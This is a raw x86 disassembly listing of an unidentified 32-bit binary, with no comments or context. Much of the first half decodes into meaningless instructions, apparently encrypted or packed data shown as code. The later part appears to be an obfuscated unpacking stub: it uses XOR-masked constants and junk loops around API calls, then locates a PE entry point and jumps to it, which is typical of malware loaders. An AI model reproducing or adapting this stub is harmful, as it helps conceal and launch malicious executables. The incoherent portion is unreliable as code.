  4223e4:	out    0x1e,al
  4223e6:	out    0x66,al
  4223e8:	push   eax
  4223e9:	sub    eax,0xad964692
  4223ee:	pop    esi
  4223ef:	ins    BYTE PTR es:[edi],dx
  4223f0:	adc    DWORD PTR [edx],esi
  4223f2:	popa   
  4223f3:	pop    esi
  4223f4:	es pop esp
  4223f6:	add    al,0xfb
  4223f8:	repz std 
  4223fa:	fidiv  DWORD PTR [esi]
  4223fc:	stos   BYTE PTR es:[edi],al
  4223fd:	push   eax
  4223fe:	cmp    al,0xdd
  422400:	mov    eax,0xb07868b5
  422405:	add    ch,dh
  422407:	aam    0x6
  422409:	pop    esp
  42240a:	mov    BYTE PTR [edi],bh
  42240c:	mov    ebx,0x45f222ff
  422411:	in     eax,0x6f
  422413:	rcl    BYTE PTR [esi+0x1d],1
  422416:	into   
  422417:	sub    al,0x6d
  422419:	sbb    BYTE PTR [edx+0x58],al
  42241c:	mov    edx,0xce691c6e
  422421:	inc    ebx
  422422:	xchg   edi,eax
  422423:	inc    ecx
  422424:	or     al,0x1f
  422426:	or     ah,bl
  422428:	xchg   ebx,eax
  422429:	lahf   
  42242a:	cld    
  42242b:	bnd es js 0x422427
  42242f:	cdq    
  422430:	lahf   
  422431:	xor    al,0x3f
  422433:	inc    edx
  422434:	popf   
  422435:	lods   eax,DWORD PTR ds:[esi]
  422436:	jle    0x422405
  422438:	xor    BYTE PTR [edi],cl
  42243a:	xchg   edi,eax
  42243b:	cmp    DWORD PTR [ebx-0xe14006],esi
  422441:	addr16 inc esi
  422443:	ror    DWORD PTR [ebx-0x24],1
  422446:	bound  esp,QWORD PTR [eax+0x4a]
  422449:	jp     0x42249c
  42244b:	dec    esp
  42244c:	pop    ebx
  42244d:	push   eax
  42244e:	leave  
  42244f:	call   0x9c57:0x41498a8
  422456:	es mov esi,0xcb3d7f97
  42245c:	inc    ebp
  42245d:	pusha  
  42245e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42245f:	imul   DWORD PTR [eax+eax*2-0x6020861a]
  422466:	or     DWORD PTR [edx-0x49b0ac5e],0xde6a9207
  422470:	pop    eax
  422471:	push   es
  422472:	aas    
  422473:	push   ss
  422474:	pop    es
  422475:	test   eax,0x3718030f
  42247a:	mov    ?,WORD PTR [ecx-0x57]
  42247d:	pop    edx
  42247e:	cli    
  42247f:	add    esp,DWORD PTR ds:0x5da4e53b
  422485:	mov    esp,0x4277bf6c
  42248a:	pop    ecx
  42248b:	sahf   
  42248c:	out    dx,al
  42248d:	sti    
  42248e:	cmc    
  42248f:	cpuid  
  422491:	jle    0x422432
  422493:	imul   edi,DWORD PTR [edx-0x5b],0x47
  422497:	stos   BYTE PTR es:[edi],al
  422498:	loop   0x422503
  42249a:	push   ebp
  42249b:	mov    ebp,0x5762cccb
  4224a0:	lahf   
  4224a1:	adc    al,0xb1
  4224a3:	nop
  4224a4:	in     eax,0xf0
  4224a6:	retf   0x2d90
  4224a9:	xchg   ebx,eax
  4224aa:	js     0x4224dc
  4224ac:	and    DWORD PTR [eax],ebp
  4224ae:	xor    al,BYTE PTR [eax+0x8]
  4224b1:	call   0x568adfaa
  4224b6:	mov    ecx,0x3dbcf2d7
  4224bb:	std    
  4224bc:	mov    al,0x5a
  4224be:	jne    0x422507
  4224c0:	jle    0x4224fe
  4224c2:	push   cs
  4224c3:	loope  0x4224f9
  4224c5:	in     eax,dx
  4224c6:	mov    dh,0x12
  4224c8:	cwde   
  4224c9:	add    DWORD PTR [ecx],ebp
  4224cb:	xlat   BYTE PTR ds:[ebx]
  4224cc:	iret   
  4224cd:	jbe    0x42251f
  4224cf:	inc    esi
  4224d0:	push   eax
  4224d1:	push   DWORD PTR [edi-0x58af6f7c]
  4224d7:	and    ah,bh
  4224d9:	and    dh,BYTE PTR [ebx+ebp*8+0x3e7e989f]
  4224e0:	rol    DWORD PTR ds:0xfb8e9e4a,0x47
  4224e7:	dec    edi
  4224e9:	mov    dh,0xd2
  4224eb:	push   esi
  4224ec:	xlat   BYTE PTR ds:[ebx]
  4224ed:	sub    BYTE PTR [ecx],0x93
  4224f0:	sar    DWORD PTR [ebx],0x54
  4224f3:	out    dx,eax
  4224f4:	and    edx,eax
  4224f6:	aaa    
  4224f7:	push   ebx
  4224f8:	aaa    
  4224f9:	jp     0x4224a9
  4224fb:	je     0x42254d
  4224fd:	cli    
  4224fe:	jae    0x422550
  422500:	in     eax,0x8d
  422502:	xor    BYTE PTR [esi+0x6e8d6514],dh
  422508:	fadd   DWORD PTR [eax]
  42250a:	aam    0x17
  42250c:	hlt    
  42250d:	pop    eax
  42250e:	push   ss
  42250f:	mov    eax,0xea8967a
  422514:	dec    edx
  422515:	jae    0x42253c
  422517:	xchg   ebp,eax
  422518:	das    
  422519:	test   DWORD PTR [edx-0x42],edx
  42251c:	or     ebp,ebp
  42251e:	mov    ebp,DWORD PTR [ecx+0x4d56a1]
  422524:	jmp    edx
  422526:	mov    ah,0x8e
  422528:	sub    BYTE PTR [eax-0x20],0x2e
  42252c:	icebp  
  42252d:	pop    ecx
  42252e:	sub    bl,BYTE PTR [eax+edi*8-0x2e6b8d1e]
  422535:	ins    DWORD PTR es:[edi],dx
  422536:	fcomp  DWORD PTR [edi+ebp*1+0x53e17737]
  42253d:	(bad)  
  42253e:	mov    ah,0x8c
  422540:	and    DWORD PTR [edx],0xffffffeb
  422543:	pushw  cs
  422545:	sub    bh,BYTE PTR [edi+ebx*2-0x72cbded3]
  42254c:	push   ecx
  42254d:	pop    ebp
  42254e:	rcr    BYTE PTR [esi-0x4be048ba],cl
  422554:	and    al,0x67
  422556:	mov    al,0xed
  422558:	loopne 0x42256c
  42255a:	aas    
  42255b:	sub    ebp,DWORD PTR [ebx-0xd40d614]
  422561:	or     BYTE PTR [edx+0x5b0c290],bl
  422567:	sbb    eax,0xdacb0814
  42256c:	pushf  
  42256d:	arpl   ax,cx
  42256f:	cs popf 
  422571:	pop    ds
  422572:	xor    DWORD PTR [esp+esi*1-0x6a],esi
  422576:	and    BYTE PTR [edx-0x33],cl
  422579:	retf   
  42257a:	or     eax,0x26b55376
  42257f:	les    esi,FWORD PTR [edi]
  422581:	ins    DWORD PTR es:[edi],dx
  422582:	cs stc 
  422584:	jecxz  0x422545
  422586:	cmp    eax,esi
  422588:	sbb    al,0xc3
  42258a:	xor    cl,BYTE PTR [esi]
  42258c:	fldcw  WORD PTR [esi-0x45]
  42258f:	and    BYTE PTR [ebx],ch
  422591:	mov    al,0x3e
  422593:	rcr    DWORD PTR ds:0xba365435,0xbd
  42259a:	leave  
  42259b:	add    bh,BYTE PTR [edi-0x50]
  42259e:	(bad)  
  42259f:	sub    edx,DWORD PTR [edi]
  4225a1:	pop    edx
  4225a2:	cmp    cl,BYTE PTR [edx+0x1a964c7a]
  4225a8:	mov    bh,0x4
  4225aa:	mov    DWORD PTR [ebp-0x60],edx
  4225ad:	mov    ch,0x35
  4225af:	(bad)  
  4225b1:	es pushf 
  4225b3:	lea    edi,[edx-0x71]
  4225b6:	pop    ebx
  4225b7:	nop
  4225b8:	mov    esp,0xf22f383b
  4225bd:	mov    ah,BYTE PTR [ecx-0x7e]
  4225c0:	dec    eax
  4225c1:	fs push ds
  4225c3:	jl     0x4225c6
  4225c5:	push   ebx
  4225c6:	hlt    
  4225c7:	fwait
  4225c8:	pop    ss
  4225c9:	scas   al,BYTE PTR es:[edi]
  4225ca:	sub    edi,edi
  4225cc:	ins    DWORD PTR es:[edi],dx
  4225cd:	adc    eax,0x2e18b1ef
  4225d2:	sub    al,0xc8
  4225d4:	push   ss
  4225d5:	arpl   WORD PTR [eiz*2-0x266e9628],cx
  4225dc:	fdivr  DWORD PTR [ebx+ebp*2+0x103a5e5a]
  4225e3:	jne    0x422631
  4225e5:	pop    ebp
  4225e6:	xor    DWORD PTR [ecx+0x6d],esi
  4225e9:	mov    cl,0x13
  4225eb:	pop    ebx
  4225ec:	push   ebp
  4225ed:	sbb    ch,BYTE PTR [ebp-0x48]
  4225f0:	push   eax
  4225f1:	scas   eax,DWORD PTR es:[edi]
  4225f2:	xchg   edi,eax
  4225f3:	ds pop ecx
  4225f5:	ja     0x422638
  4225f7:	fadd   st(7),st
  4225f9:	dec    ecx
  4225fa:	fsubr  st(0),st
  4225fc:	aam    0xd3
  4225fe:	sub    ah,BYTE PTR ds:0xf9ad7206
  422604:	test   al,0x39
  422606:	in     al,dx
  422607:	cmp    cl,BYTE PTR [ebx-0x4a560443]
  42260d:	xchg   ebx,eax
  42260e:	rcr    BYTE PTR [ecx],0x54
  422611:	popa   
  422612:	sar    DWORD PTR [ecx],cl
  422614:	add    dl,BYTE PTR [edx-0x122ffcd4]
  42261a:	or     BYTE PTR [ebp-0x46],ah
  42261d:	and    BYTE PTR [ebx-0x4ac4cb2f],dh
  422623:	mov    ecx,0x1db7af05
  422628:	hlt    
  422629:	loope  0x422631
  42262b:	cmc    
  42262c:	pop    edi
  42262d:	test   al,0x65
  42262f:	sahf   
  422630:	jne    0x422669
  422632:	aaa    
  422633:	lds    edi,FWORD PTR [ebx+0x1cebf272]
  422639:	int    0x1f
  42263b:	adc    edi,DWORD PTR [esi-0x7b4212bd]
  422641:	mov    dh,0xdf
  422643:	xor    DWORD PTR [esi+0xd51f0d6],ebx
  422649:	not    ebp
  42264b:	xor    ah,BYTE PTR [edi+edx*2-0x1034f516]
  422652:	dec    ebp
  422653:	fwait
  422654:	or     esi,edx
  422656:	jno    0x42261e
  422658:	xor    DWORD PTR [edx+0x48],ebx
  42265b:	push   ss
  42265c:	cmc    
  42265d:	sub    eax,esp
  42265f:	loop   0x4226b0
  422661:	enter  0x8f70,0xaa
  422665:	sub    BYTE PTR [edx+edx*2-0x75cf2519],ch
  42266c:	int3   
  42266d:	and    BYTE PTR [esi+0x44cda8ae],0xb
  422674:	pop    ds
  422675:	shr    DWORD PTR [ebx],1
  422677:	test   eax,0x514f6692
  42267c:	and    DWORD PTR [ebx+esi*4],eax
  42267f:	dec    ebx
  422680:	aaa    
  422681:	mov    dl,0xc3
  422683:	out    0xe3,al
  422685:	pop    ebx
  422686:	add    BYTE PTR [esi],bl
  422688:	rcl    DWORD PTR [ebx-0x6f],cl
  42268b:	loopne 0x4226a0
  42268d:	pusha  
  42268e:	pop    es
  42268f:	ret    
  422690:	outs   dx,DWORD PTR ds:[esi]
  422691:	lock clc 
  422693:	mov    ds:0xf540452c,eax
  422698:	aad    0xfe
  42269a:	bound  ebp,QWORD PTR [edx]
  42269c:	jbe    0x42266d
  42269e:	test   DWORD PTR [ecx],edi
  4226a0:	out    dx,al
  4226a1:	add    BYTE PTR [ebx-0x22],dl
  4226a4:	ins    BYTE PTR es:[edi],dx
  4226a5:	test   BYTE PTR [esi],0xdb
  4226a8:	xchg   ebp,eax
  4226a9:	adc    edx,DWORD PTR [ebx+0x69]
  4226ac:	shl    cl,0x2a
  4226af:	daa    
  4226b0:	jge    0x42272c
  4226b2:	imul   edx,DWORD PTR [ecx],0x1a
  4226b5:	lods   eax,DWORD PTR ds:[esi]
  4226b6:	mov    ?,esp
  4226b8:	jb     0x42266d
  4226ba:	fwait
  4226bb:	pop    ecx
  4226bc:	jne    0x422720
  4226be:	push   ss
  4226bf:	mov    bl,0xb6
  4226c1:	add    eax,0x9d3d08a8
  4226c6:	enter  0x1881,0x91
  4226ca:	inc    ebx
  4226cb:	push   edx
  4226cc:	xchg   ebp,eax
  4226cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226ce:	in     eax,0xd6
  4226d0:	in     al,dx
  4226d1:	xchg   edi,eax
  4226d2:	mov    edi,0x10507a3f
  4226d7:	mov    dl,0x51
  4226d9:	sbb    bh,BYTE PTR [edi+eax*1]
  4226dc:	and    DWORD PTR [esi+0x3f9979b3],0xec121fdf
  4226e6:	je     0x422765
  4226e8:	dec    ebp
  4226e9:	loopne 0x4226f6
  4226eb:	push   0x3fc61b9d
  4226f0:	imul   eax,DWORD PTR [eax],0x9e2ac5e3
  4226f6:	mov    dl,0x77
  4226f8:	pop    WORD PTR [edi+0x2c7a443c]
  4226ff:	pop    es
  422700:	xor    DWORD PTR [edx+0x43],0xffffffb9
  422704:	sbb    eax,0x8bc65ad1
  422709:	inc    ebx
  42270a:	outs   dx,DWORD PTR ds:[esi]
  42270b:	mov    DWORD PTR [edi+edi*2-0x3f],eax
  42270f:	xchg   ch,cl
  422711:	add    BYTE PTR [edi+0x14],al
  422714:	inc    eax
  422715:	outs   dx,BYTE PTR ds:[esi]
  422716:	jge    0x42272f
  422718:	or     al,0xea
  42271a:	fadd   DWORD PTR [ebx+0x8]
  42271d:	loop   0x4226f5
  42271f:	mov    ah,BYTE PTR [esp+ebx*2]
  422722:	ins    BYTE PTR es:[edi],dx
  422723:	(bad)  
  422724:	and    DWORD PTR [ecx+0x12],esi
  422727:	popf   
  422728:	retf   0x59c8
  42272b:	icebp  
  42272c:	aam    0x48
  42272e:	(bad)  
  42272f:	int    0xf
  422731:	test   DWORD PTR [eax],esi
  422733:	gs jmp 0x4353:0x6de689f2
  42273b:	int    0xd4
  42273d:	pop    esp
  42273e:	jo     0x422706
  422740:	pushf  
  422741:	daa    
  422742:	outs   dx,DWORD PTR ds:[esi]
  422743:	push   edi
  422744:	jmp    0x1bb6d767
  422749:	test   ebx,ecx
  42274b:	nop
  42274c:	clc    
  42274d:	dec    esi
  42274e:	mov    ebp,0x1b492d52
  422753:	sbb    DWORD PTR [eax-0x44ffdb4b],esp
  422759:	rol    BYTE PTR [eax],cl
  42275b:	lea    esi,[ecx+0x6d]
  42275e:	addr16 js 0x422712
  422761:	or     dl,BYTE PTR [ecx+ecx*8]
  422764:	xor    al,0x1b
  422766:	xchg   ebp,esp
  422768:	jge    0x422701
  42276a:	addr16 js 0x42271c
  42276d:	nop
  42276e:	push   0x34
  422770:	sti    
  422771:	add    eax,0xceff2377
  422776:	dec    edx
  422777:	mov    al,ds:0x3a351b85
  42277c:	sub    eax,DWORD PTR [eax+esi*4]
  42277f:	push   edi
  422780:	push   0x1b
  422782:	into   
  422783:	(bad)  
  422784:	cmp    al,0x5a
  422786:	push   esp
  422787:	cmp    eax,0x62be2d6f
  42278c:	test   eax,0x3514aa4c
  422791:	lock (bad) 
  422793:	repz sub al,0xd2
  422796:	inc    edi
  422797:	push   ebp
  422798:	int    0x6d
  42279a:	fwait
  42279b:	mov    edi,es
  42279d:	dec    eax
  42279e:	int3   
  42279f:	popa   
  4227a0:	cmp    al,0x5a
  4227a2:	adc    al,0x8d
  4227a4:	fadd   DWORD PTR [esi]
  4227a6:	xchg   esi,eax
  4227a7:	lods   eax,DWORD PTR ds:[esi]
  4227a8:	aad    0x5f
  4227aa:	jp     0x42279d
  4227ac:	daa    
  4227ad:	sbb    ecx,esp
  4227af:	inc    esi
  4227b0:	mov    dh,0x7a
  4227b2:	call   0x5b2fc8f8
  4227b7:	xor    al,0xc6
  4227b9:	pushf  
  4227ba:	rcr    DWORD PTR [ecx-0x27d9140f],1
  4227c0:	rcr    dh,cl
  4227c2:	test   al,0xe2
  4227c4:	lods   al,BYTE PTR ds:[esi]
  4227c5:	xchg   esi,eax
  4227c6:	push   0xd4edf440
  4227cb:	popf   
  4227cc:	add    edx,DWORD PTR [eax+eiz*8-0x30]
  4227d0:	cmp    esi,DWORD PTR [edi+0x74]
  4227d3:	mov    dl,0x16
  4227d5:	repnz push ecx
  4227d7:	xchg   esi,eax
  4227d8:	mov    WORD PTR [ecx],cs
  4227da:	cs jle 0x42283d
  4227dd:	xchg   esp,eax
  4227de:	movups XMMWORD PTR [eax],xmm3
  4227e1:	adc    DWORD PTR [esi+0x4fb3c806],ebx
  4227e7:	inc    esi
  4227e8:	jg     0x422823
  4227ea:	jne    0x4227ab
  4227ec:	dec    edi
  4227ed:	test   DWORD PTR [edi-0xeba067f],eax
  4227f3:	ins    DWORD PTR es:[edi],dx
  4227f4:	pop    ss
  4227f5:	sti    
  4227f6:	pushf  
  4227f7:	cld    
  4227f8:	xchg   esp,eax
  4227f9:	dec    edx
  4227fa:	aaa    
  4227fb:	sub    eax,ecx
  4227fd:	aam    0xb9
  4227ff:	inc    DWORD PTR [eax+0x537cf836]
  422805:	add    dh,ah
  422807:	xchg   BYTE PTR [esi+0x778e16dc],al
  42280d:	fsub   st(2),st
  42280f:	jge    0x4227ce
  422811:	add    BYTE PTR [edi],cl
  422813:	popa   
  422814:	jl     0x422885
  422816:	outs   dx,BYTE PTR ds:[esi]
  422817:	imul   esp,DWORD PTR ds:0xf472a3a,0xd5bf539b
  422821:	inc    ecx
  422822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422823:	or     dl,cl
  422825:	pop    ds
  422826:	out    0xcc,al
  422828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422829:	in     eax,0xe7
  42282b:	stc    
  42282c:	cdq    
  42282d:	push   ebp
  42282e:	fistp  DWORD PTR [ecx+0x5b]
  422831:	pop    esi
  422832:	jecxz  0x4227c6
  422834:	test   al,0x59
  422836:	aaa    
  422837:	test   ah,ch
  422839:	mov    fs,WORD PTR [edx-0x4e]
  42283c:	push   es
  42283d:	idiv   dl
  42283f:	xor    eax,0xe63ad8e0
  422844:	mov    edx,DWORD PTR [ebp-0x34]
  422847:	jmp    0x422873
  42284c:	mov    edx,DWORD PTR [ebp-0x3c]
  42284f:	mov    edi,DWORD PTR [ebp-0x4]
  422852:	xor    edx,eax
  422854:	xor    edi,eax
  422856:	add    edx,ecx
  422858:	add    edi,ecx
  42285a:	imul   edx,edi
  42285d:	mov    edi,DWORD PTR [ebp-0x8]
  422860:	mov    ebx,DWORD PTR [ebp-0x10]
  422863:	sub    ebx,edi
  422865:	cmp    ebx,edx
  422867:	mov    edx,DWORD PTR [ebp-0x38]
  42286a:	jbe    0x422873
  422870:	mov    edx,DWORD PTR [ebp-0x3c]
  422873:	mov    edi,DWORD PTR [ebp-0x4]
  422876:	xor    edi,eax
  422878:	xor    edx,eax
  42287a:	add    edi,ecx
  42287c:	add    edx,ecx
  42287e:	imul   edx,edi
  422881:	mov    DWORD PTR [ebp+0xc],edx
  422884:	mov    edx,DWORD PTR [ebp+0xc]
  422887:	mov    DWORD PTR [ebp-0x24],edx
  42288a:	mov    edx,DWORD PTR [ebp-0x8]
  42288d:	add    edx,DWORD PTR [ebp-0x40]
  422890:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  422897:	mov    DWORD PTR [ebp-0x1c],edx
  42289a:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  4228a1:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  4228a8:	mov    edx,DWORD PTR [ebp-0x18]
  4228ab:	xor    edx,eax
  4228ad:	add    edx,ecx
  4228af:	jmp    0x42291c
  4228b4:	mov    edx,DWORD PTR [ebp-0x18]
  4228b7:	xor    edx,eax
  4228b9:	add    edx,DWORD PTR [ebp-0x14]
  4228bc:	mov    edi,DWORD PTR [ebp-0x1c]
  4228bf:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  4228c6:	mov    BYTE PTR [ebp+0xf],dl
  4228c9:	mov    edx,DWORD PTR [ebp-0xc]
  4228cc:	xor    edx,eax
  4228ce:	add    edx,DWORD PTR [ebp-0x14]
  4228d1:	mov    edi,DWORD PTR [ebp-0x1c]
  4228d4:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  4228db:	mov    BYTE PTR [ebp+0xb],dl
  4228de:	mov    dl,BYTE PTR [ebp+0xf]
  4228e1:	mov    edi,DWORD PTR [ebp-0xc]
  4228e4:	xor    edi,eax
  4228e6:	add    edi,DWORD PTR [ebp-0x14]
  4228e9:	mov    ebx,DWORD PTR [ebp-0x1c]
  4228ec:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4228f3:	mov    dl,BYTE PTR [ebp+0xb]
  4228f6:	mov    edi,DWORD PTR [ebp-0x18]
  4228f9:	xor    edi,eax
  4228fb:	add    edi,DWORD PTR [ebp-0x14]
  4228fe:	mov    ebx,DWORD PTR [ebp-0x1c]
  422901:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  422908:	mov    edx,DWORD PTR [ebp-0x44]
  42290b:	mov    edi,DWORD PTR [ebp-0xc]
  42290e:	xor    edx,eax
  422910:	xor    edi,eax
  422912:	add    edx,ecx
  422914:	add    edi,ecx
  422916:	imul   edx,edi
  422919:	add    edx,DWORD PTR [ebp-0x14]
  42291c:	mov    DWORD PTR [ebp-0x14],edx
  42291f:	mov    edx,DWORD PTR [ebp-0xc]
  422922:	mov    edi,DWORD PTR [ebp-0x24]
  422925:	xor    edx,eax
  422927:	add    edx,ecx
  422929:	imul   edx,edi
  42292c:	mov    edi,DWORD PTR [ebp-0xc]
  42292f:	xor    edi,eax
  422931:	sub    edx,edi
  422933:	mov    edi,DWORD PTR [ebp-0xc]
  422936:	mov    ebx,DWORD PTR [ebp-0x14]
  422939:	xor    edi,eax
  42293b:	add    edi,ecx
  42293d:	imul   edi,ebx
  422940:	mov    ebx,DWORD PTR [ebp-0x18]
  422943:	xor    ebx,eax
  422945:	sub    edx,ecx
  422947:	lea    edi,[edi+ebx*1+0x327298]
  42294e:	cmp    edi,edx
  422950:	jbe    0x4228b4
  422956:	mov    edx,DWORD PTR [ebp-0xc]
  422959:	mov    edi,DWORD PTR [ebp-0x24]
  42295c:	xor    edx,eax
  42295e:	add    edx,ecx
  422960:	imul   edx,edi
  422963:	mov    edi,DWORD PTR [ebp-0x18]
  422966:	xor    edi,eax
  422968:	add    edx,edi
  42296a:	mov    edi,DWORD PTR [ebp-0x8]
  42296d:	lea    edx,[edx+edi*1+0x327298]
  422974:	mov    DWORD PTR [ebp-0x8],edx
  422977:	mov    edx,DWORD PTR [ebp-0x20]
  42297a:	xor    edx,eax
  42297c:	mov    edi,0xffcd8d68
  422981:	sub    edi,edx
  422983:	add    edi,DWORD PTR [ebp-0x10]
  422986:	mov    edx,DWORD PTR [ebp-0x20]
  422989:	mov    ebx,DWORD PTR [ebp-0x8]
  42298c:	xor    edx,eax
  42298e:	add    edx,ecx
  422990:	imul   edx,ebx
  422993:	cmp    edx,edi
  422995:	jbe    0x41a739
  42299b:	pop    ebx
  42299c:	pop    edi
  42299d:	leave  
  42299e:	ret    0x8
  4229a1:	push   ebp
  4229a2:	mov    ebp,esp
  4229a4:	push   ecx
  4229a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4229a8:	mov    eax,0x7510850
  4229ad:	xor    ecx,eax
  4229af:	adc    DWORD PTR ds:0x42a341,0x62
  4229b9:	add    ecx,0x327298
  4229bf:	mov    DWORD PTR [ebp+0x10],ecx
  4229c2:	mov    ecx,0x3ff3
  4229c7:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  4229ce:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4229d5:	mov    ecx,0xf89c8539
  4229da:	push   esi
  4229db:	mov    DWORD PTR [ebp+0x10],0x70019fa
  4229e2:	mov    DWORD PTR ds:0x42a341,0x2038
  4229ec:	mov    esi,DWORD PTR [ebp-0x4]
  4229ef:	mov    DWORD PTR ds:0x42a2fd,0x2b16
  4229f9:	cmp    ecx,esi
  4229fb:	mov    DWORD PTR ds:0x42a2e5,0x385
  422a05:	je     0x422a69
  422a0b:	dec    esi
  422a0c:	mov    esi,DWORD PTR [ebp+0xc]
  422a0f:	adc    DWORD PTR ds:0x42a2e9,0x2ac0
  422a19:	xor    ecx,eax
  422a1b:	add    DWORD PTR ds:0x42a40d,0x42a345
  422a25:	xor    esi,eax
  422a27:	sub    DWORD PTR ds:0x42a33d,0x42a371
  422a31:	lea    ecx,[esi+ecx*1+0x327298]
  422a38:	sub    DWORD PTR ds:0x42a3b1,0x25a4
  422a42:	xor    ecx,eax
  422a44:	mov    DWORD PTR ds:0x42a409,0x18df
  422a4e:	cmp    ecx,0xf89c8528
  422a54:	jne    0x4229db
  422a5a:	mov    DWORD PTR ds:0x42a301,0x7006
  422a64:	jmp    0x422ae1
  422a69:	mov    esi,DWORD PTR ds:0x42a3ed
  422a6f:	mov    esi,DWORD PTR [esi]
  422a71:	xor    DWORD PTR ds:0x42a2f5,esi
  422a77:	add    ecx,0xffcd8d68
  422a7d:	mov    esi,DWORD PTR ds:0x42a379
  422a83:	and    esi,DWORD PTR ds:0x42a2fd
  422a89:	mov    DWORD PTR ds:0x42a379,esi
  422a8f:	mov    esi,ecx
  422a91:	adc    DWORD PTR ds:0x42a301,0x42a2f5
  422a9b:	xor    esi,eax
  422a9d:	add    esi,DWORD PTR [ebp+0x8]
  422aa0:	sbb    DWORD PTR ds:0x42a385,0x42a3b9
  422aaa:	mov    DWORD PTR [ebp+0x8],esi
  422aad:	mov    esi,DWORD PTR ds:0x42a371
  422ab3:	or     DWORD PTR ds:0x42a37d,esi
  422ab9:	mov    esi,DWORD PTR [ebp+0x8]
  422abc:	or     DWORD PTR ds:0x42a40d,0x42a401
  422ac6:	xor    esi,ecx
  422ac8:	xor    esi,eax
  422aca:	mov    eax,DWORD PTR [edx+0x194]
  422ad0:	mov    ecx,DWORD PTR [eax]
  422ad2:	mov    eax,DWORD PTR [ecx+0x3c]
  422ad5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  422ad9:	add    eax,ecx
  422adb:	mov    DWORD PTR [ebp+0x8],esi
  422ade:	mov    DWORD PTR [ebp+0x10],eax
  422ae1:	mov    eax,DWORD PTR [ebp+0x10]
  422ae4:	pop    esi
  422ae5:	test   eax,eax
  422ae7:	je     0x422b0b
  422aed:	push   DWORD PTR ds:0x426bba
  422af3:	push   DWORD PTR ds:0x426966
  422af9:	mov    eax,DWORD PTR [edx+0x194]
  422aff:	push   DWORD PTR [eax]
  422b01:	mov    eax,DWORD PTR [ebp+0x10]
  422b04:	call   eax
  422b06:	jmp    0x422b0e
  422b0b:	mov    eax,DWORD PTR [ebp+0x10]
  422b0e:	leave  
  422b0f:	ret    0xc
  422b12:	push   ebp
  422b13:	mov    ebp,esp
  422b15:	sub    esp,0x40
  422b18:	sbb    DWORD PTR ds:0x42a3c1,ebx
  422b1e:	push   ebx
  422b1f:	and    DWORD PTR ds:0x42a2e1,0x0
  422b29:	mov    ecx,DWORD PTR ds:0x42a2e1
  422b2f:	inc    ecx
  422b30:	mov    DWORD PTR ds:0x42a2e1,ecx
  422b36:	cmp    DWORD PTR ds:0x42a2e1,0x10
  422b3d:	jne    0x422b7c
  422b43:	push   DWORD PTR [ebp-0x28]
  422b46:	push   DWORD PTR [ebp-0x18]
  422b49:	push   DWORD PTR [ebp-0x14]
  422b4c:	push   0x306f
  422b51:	push   DWORD PTR [ebp-0x18]
  422b54:	push   0x1d07
  422b59:	push   DWORD PTR [ebp-0x24]
  422b5c:	push   0x5967
  422b61:	push   DWORD PTR [ebp-0x28]
  422b64:	push   0x32c4
  422b69:	push   0x1f22
  422b6e:	push   0x72e0
  422b73:	push   DWORD PTR [ebp-0x24]
  422b76:	call   DWORD PTR ds:0x425008
  422b7c:	cmp    DWORD PTR ds:0x42a2e1,0xf
  422b83:	jne    0x422b96
  422b89:	mov    ecx,DWORD PTR ds:0x42a2e1
  422b8f:	inc    ecx
  422b90:	mov    DWORD PTR ds:0x42a2e1,ecx
  422b96:	cmp    DWORD PTR ds:0x42a2e1,0x1f
  422b9d:	jb     0x422b29
  422ba3:	add    DWORD PTR ds:0x42a2f9,0x3d7
  422bad:	push   esi
  422bae:	and    DWORD PTR ds:0x42a389,0x0
  422bb8:	xor    ecx,ecx
  422bba:	add    ecx,DWORD PTR ds:0x42a389
  422bc0:	inc    ecx
  422bc1:	mov    DWORD PTR ds:0x42a389,ecx
  422bc7:	cmp    DWORD PTR ds:0x42a389,0xb
  422bce:	jne    0x422be7
  422bd4:	push   DWORD PTR [ebp-0x18]
  422bd7:	push   0x23c4
  422bdc:	push   0x7367
  422be1:	call   DWORD PTR ds:0x42500c
  422be7:	cmp    DWORD PTR ds:0x42a389,0xa
  422bee:	jne    0x422c01
  422bf4:	mov    ecx,DWORD PTR ds:0x42a389
  422bfa:	inc    ecx
  422bfb:	mov    DWORD PTR ds:0x42a389,ecx
  422c01:	cmp    DWORD PTR ds:0x42a389,0x13
  422c08:	jb     0x422bb8
  422c0e:	push   edi
  422c0f:	sub    ecx,DWORD PTR ds:0x42a2f5
  422c15:	lea    eax,ds:0x426c3e
  422c1b:	push   eax
  422c1c:	push   DWORD PTR ds:0x426c3a
  422c22:	not    ecx
  422c24:	push   0x0
  422c26:	lea    eax,ds:0x42525c
  422c2c:	inc    eax
  422c2d:	inc    eax
  422c2e:	and    DWORD PTR ds:0x42a38d,0x0
  422c38:	xor    ecx,ecx
  422c3a:	xor    ecx,DWORD PTR ds:0x42a38d
  422c40:	inc    ecx
  422c41:	mov    DWORD PTR ds:0x42a38d,ecx
  422c47:	cmp    DWORD PTR ds:0x42a38d,0x1d
  422c4e:	jne    0x422c69
  422c54:	push   0x42a5c5
  422c59:	push   0x42a569
  422c5e:	push   0x400000
  422c63:	call   DWORD PTR ds:0x4251e8
  422c69:	cmp    DWORD PTR ds:0x42a38d,0x13
  422c70:	jb     0x422c38
  422c76:	and    DWORD PTR ds:0x42a401,0x0
  422c80:	xor    ecx,ecx
  422c82:	or     ecx,DWORD PTR ds:0x42a401
  422c88:	inc    ecx
  422c89:	mov    DWORD PTR ds:0x42a401,ecx
  422c8f:	cmp    DWORD PTR ds:0x42a401,0x9
  422c96:	jne    0x422cb2
  422c9c:	push   0x4ac4
  422ca1:	push   DWORD PTR [ebp-0x1c]
  422ca4:	push   0x42a57d
  422ca9:	push   DWORD PTR [ebp-0x28]
  422cac:	call   DWORD PTR ds:0x425010
  422cb2:	cmp    DWORD PTR ds:0x42a401,0x8
  422cb9:	jne    0x422ccc
